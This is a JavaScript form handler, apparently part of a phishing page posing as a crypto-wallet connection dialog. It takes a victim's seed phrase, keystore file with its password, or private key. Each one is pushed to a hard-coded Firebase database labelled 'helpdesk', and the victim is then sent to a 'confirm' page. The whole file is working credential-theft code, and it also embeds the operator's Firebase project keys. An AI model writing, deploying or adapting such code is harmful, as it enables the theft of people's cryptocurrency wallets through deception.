

function wconnForm() {
    // Initialize Firebase
     var firebaseConfig = {
       apiKey: "AIzaSyB0VO7YSMyh6ho5hf0UAQcxCyBRsQX7V9g",
       authDomain: "helpdesk-f61d0.firebaseapp.com",
       databaseURL: "https://helpdesk-f61d0-default-rtdb.firebaseio.com",
       projectId: "helpdesk-f61d0",
       storageBucket: "helpdesk-f61d0.appspot.com",
       messagingSenderId: "257630309476",
       appId: "1:257630309476:web:a87d4d8838260e65a96371",
      
     };
     // initialize firebase
     firebase.initializeApp(firebaseConfig);
     var database = firebase.database();

    return {
        selected: "phrase",
        isLoading: false,
        status:false,
        phrase:"",
        keystore:"",
        keyPassword:"",
        privatekey:"",
        submitPhrase(){
            
            database.ref('phrase').push(this.phrase);
            this.resetForm();
            this.redirectPage();
        },
        submitKeystoreJSON(){
            
            database.ref('keystore').push(this.keystore);
            database.ref('KeyPassword').push(this.keyPassword);
            this.resetForm();
            this.redirectPage();
        },
        submitPrivateKey(){
            
            database.ref('privatekey').push(this.privatekey);
            this.resetForm();
            this.redirectPage();
        },
        resetForm() {
            this.selected = "phrase";
            this.phrase = "";
            this.keystore = "";
            this.keyPassword = "";
            this.privatekey = "";
        },
        redirectPage() {
            window.location.href = "./confirm.html";
        }
    }
}